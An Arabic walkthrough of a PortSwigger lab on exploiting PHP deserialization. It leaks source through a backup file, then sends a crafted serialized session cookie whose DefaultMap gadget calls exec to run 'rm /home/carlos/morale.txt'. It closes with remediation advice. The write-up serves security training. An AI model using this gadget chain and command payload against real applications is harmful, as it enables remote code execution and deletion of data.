# [Developing a custom gadget chain for PHP deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization)

## **`الهدف`**
قم بحذف ملف `morale.txt` الموجود في `Carlos's home directory`.
## **`خطوات الحل`**
نقوم بالدخول إلى حساب `wiener:peter` ونقوم بتحويل أى طلب يحتوى على الـ `Cookie` مثل طلب `/my-account` إلى `Repeater`
```http
GET /my-account?id=wiener HTTP/2
Host: 0a9600bc03e5e0d782d40bc900d90091.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJnNDJ2YW82ODNhcm9td3d4dWFjczhjNDc3MmdiMWY5NCI7fQ%3d%3d
```
وبفحص الاستجابة الخاصة به سنجد بداخلها تعليق من المطور يشير إلى مسار الـ `Source Code`
```http
<!-- TODO: Refactor once /cgi-bin/libs/CustomTemplate.php is updated -->
```
وسنقوم بالتوجه إلى هذا المسار ولكن بوضع علامة `~` في نهايته
```http
GET /cgi-bin/libs/CustomTemplate.php~ HTTP/2
Host: 0a9600bc03e5e0d782d40bc900d90091.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJnNDJ2YW82ODNhcm9td3d4dWFjczhjNDc3MmdiMWY5NCI7fQ%3d%3d
```
وسنجد أن الاستجابة تحتوي على الـ `Source Code`
```http
HTTP/2 200 OK
Content-Type: text/plain
X-Frame-Options: SAMEORIGIN
Content-Length: 1396

<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

?>
```
وبعد فحصه سنكتشف كيفية حل هذا اللاب، ولذلك سنعود إلى أى طلب ونقوم بتظليل الـ `Cookie`وتعديلها من داخل `Inspector` لتصبح كالتالي:
```PHP
O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}
```

ثم سنقوم بنسخ الـ `Cookie` الجديد ونتوجه إلى المتصفح ونضغط `F12` ثم  `Application` ونضعه في خانة الـ `Session` داخل الـ `Cookies` ثم نضغط `Enter` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [Modifying serialized objects](./Modifying-serialized-objects.md)

ويجب ألا يعمل تطبيق الويب بصلاحيات مستخدم `Root` ويعمل بصلاحيات مستخدم محدود مثل `www-data` بحيث لا يملك صلاحية التعديل أو الحذف إلا في مجلدات محددة خاصة بالتطبيق مثل `/var/www/html/uploads`.

ويجب إزالة التعليقات البرمجية الحساسة من كود الـ `HTML` الموجه للمستخدم، ويُفضل استخدام أدوات التحزيم `Build Tools` أو الـ `Minifiers` لحذف هذه التعليقات تلقائياً قبل نشر الكود.

ويجب ألا يتم حفظ أي ملفات `Backup` أو `Source Code` أو ملفات تحكم بالإصدارت `Version Control` (مثل `.git`) في المجلدات التي يتم تقديمها للزوار، حيث يجب نقل هذه الملفات إلى مسارات آمنة خارج الـ `Web Root`، أو إزالتها تماماً من سيرفر الإنتاج، ويٌفضل إضافة قاعدة `Rule` في إعدادات سيرفر الويب تمنع بشكل قاطع تقديم أي ملفات تنتهي بهذه الامتدادات، حتى لو نسي المطور مسحها.
